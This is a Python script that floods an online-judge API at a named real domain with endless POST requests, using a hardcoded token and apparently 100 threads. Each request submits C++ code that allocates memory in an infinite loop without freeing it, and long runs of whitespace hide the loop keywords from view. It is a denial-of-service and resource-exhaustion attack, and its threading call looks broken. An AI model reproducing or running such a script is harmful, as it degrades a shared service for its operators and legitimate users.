import asyncio
import aiohttp
import json
import thread, threading, functools
from typing import Any

async def post_request(session, url, token, data):
    """
    异步发送 POST 请求并携带 token
    """
    headers = {
        "token": f"{token}",
        # "Content-Type": "application/json",  # 设置请求体为 JSON 格式
        # "User-Agent": "PythonAsyncClient"
    }
    
    try:
        # 使用 POST 请求，传递 data（作为 JSON 数据）
        async with session.post(url, headers=headers, json=data) as response:
            print(f"URL: {url}, Status: {response.status}")
            # 你可以根据需要处理返回内容
            content = await response.text()
            print(f"Content Preview: {content[:100]}")  # 显示前 100 个字符
    except Exception as e:
        print(f"Error posting to {url}: {e}")

async def send_requests(url, token, data) -> None:
    """
    无限向 URL 发送 POST 请求
    """
    async with aiohttp.ClientSession() as session:
        while True:
            await post_request(session, url, token, data)
            # await asyncio.sleep(1)  # 每秒发送一次请求（可以根据需要调整间隔）

if __name__ == "__main__":
    # 配置 URL 和 token
    target_url = "https://base.028xuexi.com/api/question/judgmentQuestionAsync"
    token = "e4c2cbe9ec4c384b79c31abfc4767698"  # 替换为你的 token

    # 配置要发送的数据（POST 请求的 body 内容）
    data_to_send = {
        'id': "4060",
        'src': '''
# include <bits/stdc++.h>
# include <chrono>
using namespace std;
int main(){
    char *p = NULL;
    long long a = 1;																																																																																																																													do
	{
    *&p = (char *) malloc(sizeof(char) * 1024);
    memset(p, '666', 1024);
    auto t = chrono::duration_cast<chrono::seconds>(chrono::system_clock::now().time_since_epoch()).count();
	a = (LONG_LONG_MAX / t < a) ? a/t : a*t;
	}
	while(true)                                                                      																																																																																																							;
	    cout << "The end";
	return!!a?!(bool)!(int)!a:!(bool)!a;
}
'''
    }

    def task(name):
        print(f"task {name} run")
        # 启动异步事件循环并开始发送请求
        asyncio.run(send_requests(target_url, token, data_to_send))

    # 启动线程池
    thread.add_many_thread([task], 100)
